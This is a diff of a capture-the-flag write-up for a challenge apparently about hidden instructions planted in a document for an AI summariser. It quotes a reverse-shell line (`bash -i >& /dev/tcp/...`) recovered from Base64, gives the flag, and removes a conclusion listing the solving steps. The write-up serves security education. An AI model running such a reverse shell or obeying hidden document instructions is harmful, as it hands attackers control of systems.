@@ -1,4 +1,4 @@
-## Writeup: tldr please summarise
+## tldr please summarise
 
 ### Challenge Description
 
@@ -37,8 +37,3 @@ After decoding the Base64 text, the content revealed  `bash -i >& /dev/tcp/261.2
 DUCTF{chatgpt_I_n33d_2_3scap3}
 ```
 
-### Conclusion
-The flag `DUCTF{chatgpt_I_n33d_2_3scap3}` was successfully obtained by:
-1. Changing the text color in the document to reveal hidden instructions.
-2. Following the Pastebin link provided in the hidden text.
-3. Decoding the Base64 text from the Pastebin link.
